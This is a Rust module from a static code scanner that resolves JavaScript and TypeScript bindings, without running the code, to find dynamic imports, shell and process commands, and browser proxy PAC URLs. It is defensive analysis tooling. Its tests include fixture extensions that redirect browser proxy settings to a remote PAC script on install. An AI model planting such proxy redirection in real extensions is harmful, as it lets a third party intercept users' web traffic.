//! JavaScript and TypeScript. One bounded walk of the syntax tree binds every
//! name by scope; then each call is read for a dynamic import, a process or
//! installer command, a resolved shell command, and a browser PAC URL.
//! No JavaScript runs: unknown values, writes, shadowing and cycles stop
//! resolution.

use std::cell::Cell;
use std::collections::{HashMap, HashSet};
use std::ops::Range;

use filefacts::tree_sitter::Node;
use filefacts::{ParsedFile, RefKind, Reference};

use super::found::{Found, clip};
use super::purl_token::Eco;
use super::shell::{Place, commands};
use super::source::{
    ARGV_METHODS, AST_NODE_BUDGET, CallSpan, MAX_CALLEE_BYTES, call_span, compact, decode_escapes,
    execution_call, import_argument, import_locator, import_source, literal_specifier, method,
    run_spans,
};
use super::urls::{git_refs, url_locator, urls};
use super::{Lang, STRING_SOURCE};
use crate::fetch::is_http_url;

/// The longest text a resolved value may hold.
const VALUE_LIMIT: usize = 16_384;
/// How many bindings, members and operands one value may pass through.
const MAX_VALUE_DEPTH: usize = 12;
/// [`Resolver::value`] steps one call site may take. Depth alone does not
/// bound the work: a template can name the same binding thousands of times at
/// every level, which multiplies.
const CALL_FUEL: u32 = 4_096;
/// [`Resolver::value`] steps the whole file may take.
const FILE_FUEL: u32 = 1_000_000;
/// The resolved text one file may build, per byte of the file. Fuel counts
/// steps, not bytes: every call site naming one long constant would rebuild
/// and rescan its whole text, so the text resolution copies is bounded
/// separately, in proportion to the file.
const TEXT_PER_FILE_BYTE: usize = 4;
/// The resolved text any file may build, however small.
const MIN_TEXT_BUDGET: usize = 1 << 20;

/// The [`RefKind::Command`] source of a VS Code `ShellExecution` command.
const SHELL_EXECUTION: &str = "vscode-shell-execution";
/// The source of a process command whose text was resolved through bindings.
const RESOLVED_COMMAND: &str = "resolved-process-command";
/// The source of a browser proxy PAC URL.
const PAC_URL: &str = "ast-browser-pac-url";

/// What an expression resolves to.
#[derive(Debug, Clone)]
enum Value {
    Text(String),
    /// A module or one of its members, as a dotted name
    /// (`child_process.exec`).
    Api(String),
}

/// What a binding was initialized with.
#[derive(Debug, Clone, Copy)]
enum Init<'a> {
    /// The binding's initializer expression.
    Value(Node<'a>),
    /// A property of the initializer: `const {exec} = require('child_process')`.
    Member(Node<'a>, &'a str),
}

/// A scope the walk recorded.
#[derive(Debug, Clone, Copy)]
struct Scope {
    depth: usize,
    /// The index of the nearest function-level scope around it, itself
    /// included: where a `var` or a parameter declared in it binds.
    function: usize,
}

/// What the walk met, in its order: a scope it entered, or a name used in
/// one (by the identifier's node id and the index of its innermost scope).
#[derive(Debug, Clone, Copy)]
enum Visit<'a> {
    Scope(usize),
    Name(usize, usize, &'a str),
}

/// The calls and comments the walk collects besides the bindings.
#[derive(Debug, Default)]
struct Sites<'a> {
    calls: Vec<Node<'a>>,
    comments: Vec<Range<usize>>,
}

/// What reading the calls collects, to recognize once every call is read.
#[derive(Debug, Default)]
struct Calls<'a> {
    spans: Vec<CallSpan>,
    /// Resolved commands: the call, the source to label its references
    /// with, and the command text.
    commands: Vec<(Node<'a>, &'static str, String)>,
    /// The command texts in `commands`.
    seen: HashSet<String>,
}

#[derive(Debug, Default)]
struct Resolver<'a> {
    text: &'a str,
    /// Each name bound in a scope (by the scope's index) and its
    /// initializer; `None` when unknown, ambiguous, or written.
    bindings: HashMap<(usize, &'a str), Option<Init<'a>>>,
    /// Every scope in the file, in the order the walk entered them.
    scopes: Vec<Scope>,
    /// The binding each identifier names, by its node id: resolved once for
    /// the whole file, so a lookup never climbs a chain of scopes.
    keys: HashMap<usize, (usize, &'a str)>,
    /// Module-level ESM import bindings: local name → the API it names
    /// (`exec` → `node:child_process.exec`, `cp` → `child_process`). Imports
    /// are immutable and hoisted, so one consulted only when no local binding
    /// shadows the name stays exact. `None` when the name is imported twice.
    imports: HashMap<&'a str, Option<String>>,
    /// Identifiers inside a `with` body, which may name any property of its
    /// object: they resolve to nothing.
    opaque: HashSet<usize>,
    /// Namespace roots assigned anywhere in the file are not trusted globals.
    written_roots: HashSet<&'a str>,
    /// [`Resolver::value`] steps left.
    fuel: Cell<u32>,
    /// Bytes of resolved text left to build in the file (see
    /// [`TEXT_PER_FILE_BYTE`]). Never reaches zero except by running out.
    text_left: Cell<usize>,
}

/// Whether a node of `kind` opens a scope.
fn is_scope(kind: &str) -> bool {
    matches!(
        kind,
        "program"
            | "statement_block"
            | "function_declaration"
            | "function_expression"
            | "arrow_function"
            | "method_definition"
            | "catch_clause"
            // A `let`/`const` in a loop header binds in the loop, not around it.
            | "for_statement"
            | "for_in_statement"
    )
}

/// Scan a JavaScript or TypeScript file.
pub(super) fn scan(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
    let label = Lang::JavaScript.label();
    let mut text = out.text();
    if let Some(ast) = parsed.source_ast() {
        let source = ast.source;
        let mut resolver = Resolver {
            text: source,
            text_left: Cell::new(
                source
                    .len()
                    .saturating_mul(TEXT_PER_FILE_BYTE)
                    .max(MIN_TEXT_BUDGET),
            ),
            ..Resolver::default()
        };
        // A partial binding table could mistake a later write for a constant,
        // so a walk cut short resolves no calls at all.
        match resolver.walk(ast.tree.root_node()) {
            Ok(sites) => read_calls(&resolver, sites, out),
            Err(limit) => out.cut_off(label, limit),
        }
        text = text.or(Some(source));
    }
    // The text scans read the file's own text, so each line is placed where
    // it sits rather than searched for. They run after the calls, so a PAC
    // URL's API citation is already in place and their sighting of it is a
    // duplicate.
    if let Some(text) = text {
        git_refs(text, label, out);
        urls(text, label, out);
    }
}

/// Read every call the walk found, within the file's resolution fuel and
/// text budget, and recognize the commands they run.
fn read_calls<'a>(resolver: &Resolver<'a>, mut sites: Sites<'a>, out: &mut Found<'_>) {
    let label = Lang::JavaScript.label();
    sites.calls.sort_by_key(Node::start_byte);
    let mut found = Calls::default();
    let mut fuel = FILE_FUEL;
    let mut starved = 0;
    for node in sites.calls {
        if out.is_full() {
            return;
        }
        if fuel == 0 {
            out.cut_off(label, "resolution fuel");
            break;
        }
        let budget = CALL_FUEL.min(fuel);
        resolver.fuel.set(budget);
        read_call(resolver, node, out, &mut found);
        let left = resolver.fuel.get();
        starved += usize::from(left == 0);
        fuel -= budget - left;
    }
    if starved > 0 {
        tracing::debug!(
            calls = starved,
            limit = CALL_FUEL,
            "js resolution: per-call fuel spent; those calls stay unresolved"
        );
    }
    if resolver.text_left.get() == 0 {
        out.cut_off(label, "resolved text budget");
    }
    run_spans(
        resolver.text,
        found.spans,
        sites.comments,
        Lang::JavaScript,
        out,
    );
    for (node, source, command) in found.commands {
        if out.is_full() {
            return;
        }
        let call = clip(resolver.raw(node).unwrap_or(&command));
        let place = Place::Call(node.start_byte() as u64, call);
        commands(&command, place, Lang::JavaScript, source, out);
    }
}

/// Read one call or `new` expression.
fn read_call<'a>(
    resolver: &Resolver<'a>,
    node: Node<'a>,
    out: &mut Found<'_>,
    found: &mut Calls<'a>,
) {
    let Some(callee) = node
        .child_by_field_name("constructor")
        .or_else(|| node.child_by_field_name("function"))
    else {
        return;
    };
    let api = resolver.api(callee, 0);
    if node.kind() == "call_expression"
        && let Some(arguments) = node.child_by_field_name("arguments")
    {
        dynamic_import(resolver, node, callee, arguments, out);
        // A callee the resolver cannot follow is matched by its spelling.
        let span = match &api {
            Some(api) => call_span(Lang::JavaScript, api, node, arguments),
            None => resolver
                .raw(callee)
                .filter(|c| c.len() <= MAX_CALLEE_BYTES)
                .and_then(|raw| call_span(Lang::JavaScript, &compact(raw), node, arguments)),
        };
        found.spans.extend(span);
        // A PAC URL is cited by its API call, not by the plain string scan
        // that also saw it; a declared reference keeps its place.
        if let Some(url) = proxy_pac_url(resolver, node) {
            let mut reference = Reference::new(
                url_locator(&url),
                RefKind::UrlFetch,
                PAC_URL,
                clip(resolver.raw(node).unwrap_or(&url)),
            );
            reference.offset = Some(node.start_byte() as u64);
            out.supersede(reference, &[STRING_SOURCE, Lang::JavaScript.label()]);
        }
    }
    // A command repeated at another call site yields the same references,
    // which would be dropped as duplicates: don't pay to scan it again.
    if let Some(api) = api
        && let Some((source, command)) = resolved_command(resolver, node, &api)
        && found.seen.insert(command.clone())
    {
        found.commands.push((node, source, command));
    }
}

/// A `require('pkg')` or `import('pkg')` with a literal specifier. A local
/// `require` binding shadows the loader.
fn dynamic_import<'a>(
    resolver: &Resolver<'a>,
    node: Node<'a>,
    function: Node<'a>,
    arguments: Node<'a>,
    out: &mut Found<'_>,
) {
    let loads = match function.kind() {
        "import" => true,
        "identifier" => {
            resolver.raw(function) == Some("require")
                && resolver.key(function).is_none()
                && !resolver.opaque.contains(&function.id())
        }
        _ => false,
    };
    if loads
        && let Some(spec) = import_argument(resolver.text, arguments)
        && let Some((locator, kind)) = import_locator(Eco::Npm, spec)
    {
        out.push_at(
            locator,
            kind,
            import_source(Eco::Npm),
            spec,
            Some(node.start_byte() as u64),
        );
    }
}

/// The shell command a process-execution call runs, when its first argument
/// resolves, and the source its references carry: a VS Code `ShellExecution`
/// or another resolved process command. An argument vector is not one
/// command, so argv APIs are left to the call's span.
fn resolved_command<'a>(
    resolver: &Resolver<'a>,
    node: Node<'a>,
    api: &str,
) -> Option<(&'static str, String)> {
    let source = if api == "vscode.ShellExecution" {
        SHELL_EXECUTION
    } else if execution_call(Lang::JavaScript, api) && !ARGV_METHODS.contains(&method(api)) {
        RESOLVED_COMMAND
    } else {
        return None;
    };
    let argument = node.child_by_field_name("arguments")?.named_child(0)?;
    Some((source, resolver.string(argument, 0)?))
}

impl<'a> Resolver<'a> {
    /// Charge `bytes` of built text to the file's budget; `None` once it is
    /// spent.
    fn spend(&self, bytes: usize) -> Option<()> {
        let left = self.text_left.get();
        if bytes >= left {
            if left > 0 {
                tracing::debug!(
                    file_bytes = self.text.len(),
                    "js resolution: resolved text budget spent; later values stay unresolved"
                );
            }
            self.text_left.set(0);
            return None;
        }
        self.text_left.set(left - bytes);
        Some(())
    }

    /// The source text of `node`.
    fn raw(&self, node: Node<'a>) -> Option<&'a str> {
        self.text.get(node.byte_range())
    }

    /// Walk the tree once: bind every declared name in its scope, resolve
    /// every name to its binding, then unbind every name a write reaches.
    /// Returns the calls and comments, or the limit the walk stopped at.
    fn walk(&mut self, root: Node<'a>) -> Result<Sites<'a>, &'static str> {
        // Each node with its innermost enclosing scope, its parent's kind, and
        // whether it sits in a `with` body.
        let mut stack: Vec<(Node<'a>, Option<usize>, &'a str, bool)> =
            vec![(root, None, "", false)];
        let mut sites = Sites::default();
        let mut writes = Vec::new();
        let mut visits = Vec::new();
        let mut visited = 0;
        // One cursor serves every node: `named_children` resets it, and a
        // fresh one per node is an allocation per node.
        let mut cursor = root.walk();
        while let Some((node, outer, parent, in_with)) = stack.pop() {
            visited += 1;
            if visited > AST_NODE_BUDGET {
                return Err("AST node budget");
            }
            // `kind` copies and validates the grammar's name, so it is read
            // once per node.
            let kind = node.kind();
            let inner = if is_scope(kind) {
                let scope = self.enter(kind, outer);
                visits.push(Visit::Scope(scope));
                Some(scope)
            } else {
                outer
            };
            match kind {
                "identifier" | "shorthand_property_identifier_pattern" => {
                    if in_with {
                        self.opaque.insert(node.id());
                    } else if let Some(scope) = outer
                        && let Some(name) = self.raw(node)
                    {
                        visits.push(Visit::Name(node.id(), scope, name));
                    }
                }
                "comment" => sites.comments.push(node.byte_range()),
                "new_expression" | "call_expression" => sites.calls.push(node),
                _ => self.declare(node, kind, outer, inner, parent, &mut writes),
            }
            // A `with` statement's object is evaluated normally; its body is not.
            let with_body = if kind == "with_statement" {
                node.child_by_field_name("body")
            } else {
                None
            };
            stack.extend(
                node.named_children(&mut cursor)
                    .map(|child| (child, inner, kind, in_with || with_body == Some(child))),
            );
        }
        self.resolve_names(visits);
        self.invalidate(writes);
        Ok(sites)
    }

    /// Record a scope opened inside `outer`, returning its index.
    fn enter(&mut self, kind: &str, outer: Option<usize>) -> usize {
        let index = self.scopes.len();
        let parent = outer.and_then(|o| self.scopes.get(o));
        // A block-like scope holds no `var`: one declared in it binds in the
        // nearest function-level scope, or the outermost when there is none.
        let block = matches!(
            kind,
            "statement_block" | "catch_clause" | "for_statement" | "for_in_statement"
        );
        let function = match parent {
            Some(parent) if block => parent.function,
            _ => index,
        };
        let depth = parent.map_or(0, |parent| parent.depth + 1);
        self.scopes.push(Scope { depth, function });
        index
    }

    /// Record what `node` declares, and any write it makes.
    fn declare(
        &mut self,
        node: Node<'a>,
        kind: &str,
        outer: Option<usize>,
        inner: Option<usize>,
        parent: &str,
        writes: &mut Vec<Node<'a>>,
    ) {
        match kind {
            "import_statement" => self.import(node),
            // Declared names shadow like any other binding; their values are
            // never commands.
            "function_declaration" | "generator_function_declaration" | "class_declaration" => {
                let function_scoped = kind != "class_declaration";
                if let Some(name) = node.child_by_field_name("name")
                    && let Some(owner) = self.owner(outer, function_scoped)
                {
                    self.bind(name, None, owner);
                }
            }
            // `for (const c of xs)` declares in the loop (a `var`, around it);
            // a bare `for (c of xs)` assigns.
            "for_in_statement" => {
                if let Some(left) = node.child_by_field_name("left") {
                    match node.child_by_field_name("kind") {
                        Some(declaration) => {
                            let function_scoped = self.raw(declaration) == Some("var");
                            if let Some(owner) = self.owner(inner, function_scoped) {
                                self.bind(left, None, owner);
                            }
                        }
                        None => writes.push(left),
                    }
                }
            }
            "variable_declarator" => {
                if let Some(name) = node.child_by_field_name("name")
                    && let Some(owner) = self.owner(outer, parent == "variable_declaration")
                {
                    self.bind(name, node.child_by_field_name("value"), owner);
                }
            }
            "formal_parameters" => {
                if let Some(owner) = self.owner(outer, true) {
                    self.bind(node, None, owner);
                }
            }
            // The parameter binds in the function or clause itself.
            "arrow_function" | "catch_clause" => {
                if let Some(parameter) = node.child_by_field_name("parameter")
                    && let Some(owner) = inner
                {
                    self.bind(parameter, None, owner);
                }
            }
            "assignment_expression" | "augmented_assignment_expression" => {
                writes.extend(node.child_by_field_name("left"));
            }
            "update_expression" => writes.extend(node.child_by_field_name("argument")),
            _ => {}
        }
    }

    /// The index of the scope a declaration inside `scope` binds into: the
    /// scope itself, or for a `var` or parameter the nearest function-level
    /// one.
    fn owner(&self, scope: Option<usize>, function_scoped: bool) -> Option<usize> {
        let scope = scope?;
        let found = self.scopes.get(scope)?;
        Some(if function_scoped {
            found.function
        } else {
            scope
        })
    }

    /// Resolve each name the walk met to the binding it refers to: the
    /// innermost enclosing scope that binds it. The walk met scopes and names
    /// in preorder, so replaying that order with, per name, a stack of the
    /// scopes binding it that are still open costs time linear in the file,
    /// however deep its scopes nest.
    fn resolve_names(&mut self, visits: Vec<Visit<'a>>) {
        let mut bound: Vec<(usize, &'a str)> = self.bindings.keys().copied().collect();
        bound.sort_unstable();
        let names = |scope: usize| {
            let start = bound.partition_point(|&(s, _)| s < scope);
            bound
                .get(start..)
                .unwrap_or_default()
                .iter()
                .take_while(move |&&(s, _)| s == scope)
                .map(|&(_, name)| name)
        };
        let depth = |scope: usize| self.scopes.get(scope).map_or(0, |s| s.depth);
        let mut in_force: HashMap<&'a str, Vec<usize>> = HashMap::new();
        let mut open: Vec<usize> = Vec::new();
        for visit in visits {
            // Close the scopes the walk has left: every open one at least as
            // deep as a scope entered, or deeper than a name's own.
            let (scope, deepest) = match visit {
                Visit::Scope(scope) => (scope, depth(scope)),
                Visit::Name(_, scope, _) => (scope, depth(scope) + 1),
            };
            while let Some(&top) = open.last()
                && depth(top) >= deepest
            {
                open.pop();
                for name in names(top) {
                    in_force.get_mut(name).and_then(Vec::pop);
                }
            }
            match visit {
                Visit::Scope(_) => {
                    open.push(scope);
                    for name in names(scope) {
                        in_force.entry(name).or_default().push(scope);
                    }
                }
                Visit::Name(id, _, name) => {
                    if let Some(&owner) = in_force.get(name).and_then(|scopes| scopes.last()) {
                        self.keys.insert(id, (owner, name));
                    }
                }
            }
        }
    }

    /// The binding identifier `node` refers to.
    fn key(&self, node: Node<'a>) -> Option<(usize, &'a str)> {
        self.keys.get(&node.id()).copied()
    }

    /// Record an `import_statement`'s bindings: a default or namespace import
    /// names the module, a named one the module's member.
    fn import(&mut self, node: Node<'a>) {
        let Some(module) = node
            .child_by_field_name("source")
            .and_then(|source| self.raw(source))
            .and_then(literal_specifier)
        else {
            return;
        };
        let mut cursor = node.walk();
        let Some(clause) = node
            .named_children(&mut cursor)
            .find(|child| child.kind() == "import_clause")
        else {
            return;
        };
        let mut nodes = vec![clause];
        while let Some(node) = nodes.pop() {
            let binding = match node.kind() {
                "identifier" => self.raw(node).map(|local| (local, module.to_owned())),
                "import_specifier" => node.child_by_field_name("name").and_then(|name| {
                    let local = node.child_by_field_name("alias").unwrap_or(name);
                    Some((self.raw(local)?, format!("{module}.{}", self.raw(name)?)))
                }),
                _ => {
                    nodes.extend(node.named_children(&mut cursor));
                    None
                }
            };
            if let Some((local, api)) = binding {
                // A name imported twice is ambiguous: resolve neither.
                self.imports
                    .entry(local)
                    .and_modify(|api| *api = None)
                    .or_insert(Some(api));
            }
        }
    }

    /// Bind the names in the pattern `name` into `owner`, initialized by
    /// `value`. A name bound twice in one scope is ambiguous and resolves to
    /// nothing.
    fn bind(&mut self, name: Node<'a>, value: Option<Node<'a>>, owner: usize) {
        let mut nodes = vec![(name, value.map(Init::Value))];
        while let Some((node, init)) = nodes.pop() {
            match node.kind() {
                "identifier" | "shorthand_property_identifier_pattern" => {
                    if let Some(raw) = self.raw(node) {
                        self.bindings
                            .entry((owner, raw))
                            .and_modify(|old| *old = None)
                            .or_insert(init);
                    }
                }
                // `const {exec, spawn: run} = require('child_process')` binds
                // each name to that member of the value; any other pattern
                // inside is opaque, though its names still shadow.
                "object_pattern" => {
                    let object = match init {
                        Some(Init::Value(object)) => Some(object),
                        _ => None,
                    };
                    let mut cursor = node.walk();
                    for child in node.named_children(&mut cursor) {
                        nodes.push(self.member_binding(child, object));
                    }
                }
                // A default value binds nothing; walking it would make nested
                // defaults (`f(a=function(a=function(…`) quadratic.
                "assignment_pattern" | "object_assignment_pattern" => {
                    nodes.extend(node.child_by_field_name("left").map(|left| (left, None)));
                }
                _ => {
                    let mut cursor = node.walk();
                    nodes.extend(node.named_children(&mut cursor).map(|child| (child, None)));
                }
            }
        }
    }

    /// The name an object-pattern entry binds and, for a plain `name` or
    /// `key: name` entry of a known `object`, the member it is initialized to.
    fn member_binding(
        &self,
        entry: Node<'a>,
        object: Option<Node<'a>>,
    ) -> (Node<'a>, Option<Init<'a>>) {
        let member = |property: Node<'a>| Some(Init::Member(object?, self.raw(property)?));
        match entry.kind() {
            "shorthand_property_identifier_pattern" => (entry, member(entry)),
            "pair_pattern" => match (
                entry.child_by_field_name("key"),
                entry.child_by_field_name("value"),
            ) {
                (Some(key), Some(value))
                    if key.kind() == "property_identifier" && value.kind() == "identifier" =>
                {
                    (value, member(key))
                }
                _ => (entry, None),
            },
            _ => (entry, None),
        }
    }

    /// Unbind every name a write can reach — destructuring included — since
    /// it is no longer a constant. A member target writes a property, not a
    /// binding, but its root is no longer a trusted global.
    fn invalidate(&mut self, mut targets: Vec<Node<'a>>) {
        while let Some(node) = targets.pop() {
            let mut root = node;
            while matches!(root.kind(), "member_expression" | "subscript_expression") {
                let Some(object) = root.child_by_field_name("object") else {
                    break;
                };
                root = object;
            }
            if root.kind() == "identifier"
                && let Some(name) = self.raw(root)
            {
                self.written_roots.insert(name);
            }
            match node.kind() {
                "identifier" | "shorthand_property_identifier_pattern" => {
                    if let Some(key) = self.key(node) {
                        self.bindings.insert(key, None);
                    }
                }
                "member_expression" | "subscript_expression" => {}
                "assignment_pattern" | "object_assignment_pattern" => {
                    targets.extend(node.child_by_field_name("left"));
                }
                "pair_pattern" => targets.extend(node.child_by_field_name("value")),
                _ => {
                    let mut cursor = node.walk();
                    targets.extend(node.named_children(&mut cursor));
                }
            }
        }
    }

    /// What `node` evaluates to, when that is a known constant text or API.
    fn value(&self, node: Node<'a>, depth: usize) -> Option<Value> {
        self.fuel.set(self.fuel.get().checked_sub(1)?);
        if depth > MAX_VALUE_DEPTH || node.end_byte() - node.start_byte() > VALUE_LIMIT {
            return None;
        }
        match node.kind() {
            "identifier" => self.identifier_value(node, depth),
            "string" => {
                let raw = self.raw(node)?;
                let content = raw.get(1..raw.len().checked_sub(1)?)?;
                self.spend(content.len())?;
                Some(Value::Text(
                    decode_escapes(content).unwrap_or_else(|| content.to_owned()),
                ))
            }
            "template_string" => self.template_value(node, depth),
            "binary_expression" if self.raw(node.child_by_field_name("operator")?)? == "+" => {
                let mut left = self.string(node.child_by_field_name("left")?, depth + 1)?;
                let right = self.string(node.child_by_field_name("right")?, depth + 1)?;
                if left.len() + right.len() > VALUE_LIMIT {
                    return None;
                }
                self.spend(left.len() + right.len())?;
                left.push_str(&right);
                Some(Value::Text(left))
            }
            "call_expression" => {
                let function = node.child_by_field_name("function")?;
                if self.raw(function)? != "require" || self.key(function).is_some() {
                    return None;
                }
                let module = node.child_by_field_name("arguments")?.named_child(0)?;
                Some(Value::Api(self.string(module, depth + 1)?))
            }
            "member_expression" => {
                let module = self.api(node.child_by_field_name("object")?, depth + 1)?;
                self.member(&module, self.raw(node.child_by_field_name("property")?)?)
            }
            "parenthesized_expression" => self.value(node.named_child(0)?, depth + 1),
            _ => None,
        }
    }

    /// What `node` evaluates to, when that is known text.
    fn string(&self, node: Node<'a>, depth: usize) -> Option<String> {
        match self.value(node, depth)? {
            Value::Text(text) => Some(text),
            Value::Api(_) => None,
        }
    }

    /// The API `node` names, when it names one.
    fn api(&self, node: Node<'a>, depth: usize) -> Option<String> {
        match self.value(node, depth)? {
            Value::Api(api) => Some(api),
            Value::Text(_) => None,
        }
    }

    /// The member `property` of the API `module`.
    fn member(&self, module: &str, property: &str) -> Option<Value> {
        self.spend(module.len() + property.len())?;
        Some(Value::Api(format!("{module}.{property}")))
    }

    /// What the binding an identifier names holds; an unbound name is an
    /// ESM import or nothing.
    fn identifier_value(&self, node: Node<'a>, depth: usize) -> Option<Value> {
        if self.opaque.contains(&node.id()) {
            return None;
        }
        let Some(key) = self.key(node) else {
            let api = self.imports.get(self.raw(node)?)?.as_ref()?;
            self.spend(api.len())?;
            return Some(Value::Api(api.clone()));
        };
        let init = (*self.bindings.get(&key)?)?;
        let (Init::Value(source) | Init::Member(source, _)) = init;
        // Reject forward references as well as cyclic initializers.
        if source.start_byte() >= node.start_byte() {
            return None;
        }
        match init {
            Init::Value(value) => self.value(value, depth + 1),
            Init::Member(object, property) => self.member(&self.api(object, depth + 1)?, property),
        }
    }

    /// A template literal whose substitutions are all known text.
    fn template_value(&self, node: Node<'a>, depth: usize) -> Option<Value> {
        let mut value = String::new();
        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            match child.kind() {
                "string_fragment" | "escape_sequence" => {
                    let raw = self.raw(child)?;
                    value.push_str(&decode_escapes(raw).unwrap_or_else(|| raw.to_owned()));
                }
                "template_substitution" => {
                    value.push_str(&self.string(child.named_child(0)?, depth + 1)?);
                }
                _ => return None,
            }
            if value.len() > VALUE_LIMIT {
                return None;
            }
        }
        self.spend(value.len())?;
        Some(Value::Text(value))
    }
}

/// A direct object field. Spreads, computed keys, duplicate keys and methods
/// make the entire object unresolved: none may silently override the URL/mode.
fn object_field<'a>(resolver: &Resolver<'a>, object: Node<'a>, wanted: &str) -> Option<Node<'a>> {
    if object.kind() != "object" {
        return None;
    }
    let mut cursor = object.walk();
    let mut names = HashSet::new();
    let mut found = None;
    for pair in object
        .named_children(&mut cursor)
        .filter(|child| !child.is_extra())
    {
        if pair.kind() != "pair" {
            return None;
        }
        let key = pair.child_by_field_name("key")?;
        let key = match key.kind() {
            "property_identifier" => resolver.raw(key)?.to_owned(),
            "string" => resolver.string(key, 0)?,
            _ => return None,
        };
        let is_wanted = key == wanted;
        if !names.insert(key) {
            return None;
        }
        if is_wanted {
            found = pair.child_by_field_name("value");
        }
    }
    found
}

/// Firefox/Chrome proxy settings select a separately downloaded PAC program.
/// Require the real API shape, an unshadowed namespace, the active PAC mode,
/// and a bounded resolved URL. Documentation, POST sinks and saved settings
/// do not supply code dependencies. This does not execute or trust the PAC.
fn proxy_pac_url<'a>(resolver: &Resolver<'a>, call: Node<'a>) -> Option<String> {
    let function = call.child_by_field_name("function")?;
    let mut callee = function;
    for name in ["set", "settings", "proxy"] {
        if callee.kind() != "member_expression"
            || resolver.raw(callee.child_by_field_name("property")?)? != name
        {
            return None;
        }
        callee = callee.child_by_field_name("object")?;
    }
    let root = resolver.raw(callee)?;
    // The optional-chaining test reads the callee's whole text, so it waits
    // until the callee is known to be the short `<root>.proxy.settings.set`
    // path: reading it at every `.set` of a long `x.set().set()…` chain
    // would cost time quadratic in the chain.
    if callee.kind() != "identifier"
        || !matches!(root, "browser" | "chrome")
        || resolver.raw(function)?.contains("?.")
        || resolver.key(callee).is_some()
        || resolver.imports.contains_key(root)
        || resolver.opaque.contains(&callee.id())
        || resolver.written_roots.contains(root)
    {
        return None;
    }
    let arguments = call.child_by_field_name("arguments")?;
    let mut cursor = arguments.walk();
    let config = arguments
        .named_children(&mut cursor)
        .find(|child| !child.is_extra())?;
    let value = object_field(resolver, config, "value")?;
    let mode_key = if root == "browser" {
        "proxyType"
    } else {
        "mode"
    };
    let mode = resolver.string(object_field(resolver, value, mode_key)?, 0)?;
    let url = match (root, mode.as_str()) {
        ("browser", "autoConfig") => object_field(resolver, value, "autoConfigUrl")?,
        ("chrome", "pac_script") => {
            object_field(resolver, object_field(resolver, value, "pacScript")?, "url")?
        }
        _ => return None,
    };
    let url = resolver.string(url, 0)?;
    is_http_url(&url).then_some(url)
}

#[cfg(test)]
mod tests {
    use super::super::references_in_bytes;
    use super::super::tests::purls;
    use filefacts::{RefKind, RefLocator, Reference};

    fn sourced(source: &str, filename: &str, label: &str) -> Vec<Reference> {
        references_in_bytes(source.as_bytes(), filename)
            .references
            .into_iter()
            .filter(|r| r.source == label)
            .collect()
    }

    /// Every command reference resolved through bindings.
    fn resolved(source: &str) -> Vec<String> {
        sourced(source, "index.mjs", super::RESOLVED_COMMAND)
            .into_iter()
            .filter_map(|r| match r.locator {
                RefLocator::Purl(p) => Some(p),
                _ => None,
            })
            .collect()
    }

    fn shell_executions(source: &str) -> Vec<Reference> {
        sourced(source, "extension.js", super::SHELL_EXECUTION)
            .into_iter()
            .filter(|r| r.kind == RefKind::Command)
            .collect()
    }

    #[test]
    fn browser_pac_programs_follow_active_settings_with_source_offsets() {
        for (source, filename, url) in [
            (
                r#"browser.runtime.onInstalled.addListener(()=>{browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://example.invalid/proxy.pac'}});});"#,
                "background.js",
                "https://example.invalid/proxy.pac",
            ),
            (
                r#"const host='https://example.invalid'; browser.proxy.settings.set(/*config*/{'value':{'proxyType':'autoConfig','autoConfigUrl':host+'/next.pac'}});"#,
                "background.ts",
                "https://example.invalid/next.pac",
            ),
            (
                r#"chrome.proxy.settings.set({value:{mode:'pac_script',pacScript:{url:'https://example.invalid/chrome.pac'}}});"#,
                "background.js",
                "https://example.invalid/chrome.pac",
            ),
        ] {
            let all = references_in_bytes(source.as_bytes(), filename).references;
            let refs: Vec<_> = all.iter().filter(|r| r.source == super::PAC_URL).collect();
            assert_eq!(refs.len(), 1, "{source}");
            assert_eq!(refs[0].locator, RefLocator::Url(url.to_owned()));
            assert_eq!(refs[0].kind, RefKind::UrlFetch);
            let offset = refs[0].offset.unwrap() as usize;
            assert!(
                source[offset..].starts_with("browser.proxy.settings.set")
                    || source[offset..].starts_with("chrome.proxy.settings.set")
            );
            // The API citation replaces the plain string and text hits.
            assert_eq!(
                all.iter()
                    .filter(|r| r.locator == RefLocator::Url(url.to_owned()))
                    .count(),
                1,
                "{all:?}"
            );
        }
    }

    #[test]
    fn browser_pac_unknown_overridden_shadowed_and_documented_values_have_no_api_citation() {
        let config =
            "{value:{proxyType:'autoConfig',autoConfigUrl:'https://example.invalid/proxy.pac'}}";
        for source in [
            format!("// browser.proxy.settings.set({config});"),
            format!("const documentation=\"browser.proxy.settings.set({config})\";"),
            format!("function f(browser){{browser.proxy.settings.set({config});}}"),
            format!("const browser=local; browser.proxy.settings.set({config});"),
            format!("import browser from 'some-polyfill'; browser.proxy.settings.set({config});"),
            format!("browser=local; browser.proxy.settings.set({config});"),
            format!("browser.proxy.settings=local; browser.proxy.settings.set({config});"),
            format!("with(local){{browser.proxy.settings.set({config});}}"),
            "browser.proxy.settings.set({value:{proxyType:'system',autoConfigUrl:'https://example.invalid/unused.pac'}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:unknown}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:`https://${host}/proxy.pac`}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://example.invalid/decoy.pac',...other}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://example.invalid/decoy.pac',autoConfigUrl:unknown}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://example.invalid/decoy.pac',[key]:unknown}});".into(),
            "browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'data:application/x-ns-proxy-autoconfig,return DIRECT'}});".into(),
            "chrome.proxy.settings.set({value:{mode:'fixed_servers',pacScript:{url:'https://example.invalid/unused.pac'}}});".into(),
            "browser.storage.local.set({autoConfigUrl:'https://example.invalid/saved.pac'});".into(),
            "fetch('https://example.invalid/submission',{method:'POST',body:JSON.stringify({autoConfigUrl:'https://example.invalid/saved.pac'})});".into(),
        ] {
            assert!(sourced(&source, "background.js", super::PAC_URL).is_empty(), "{source}");
        }
    }

    #[test]
    fn resolves_pinned_constructor_command_with_lexical_bindings() {
        for declaration in ["const", "let", "var"] {
            let source = format!(
                r#"{declaration} api=require("vscode"),revision="abcdef0123456789";
